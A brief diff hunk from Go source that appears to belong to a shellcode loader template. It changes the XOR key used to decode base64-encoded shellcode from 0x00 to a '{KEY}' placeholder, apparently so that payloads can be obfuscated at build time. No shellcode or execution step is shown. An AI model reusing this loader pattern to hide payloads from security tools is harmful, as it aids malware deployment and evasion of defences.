@@ -86,7 +86,7 @@ func retreiveShellcodeAsBytes() []byte {
 	//Decode the shellcode by XORing it with the predefined key (If the shellcode is not encoded, use 0x00)
 	decodedBytes := make([]byte, len(decodedBase64))
 	for i := 0; i < len(decodedBase64); i++ {
-		decodedBytes[i] = decodedBase64[i] ^ 0x00
+		decodedBytes[i] = decodedBase64[i] ^ {KEY}
 	}
 
 	return decodedBytes
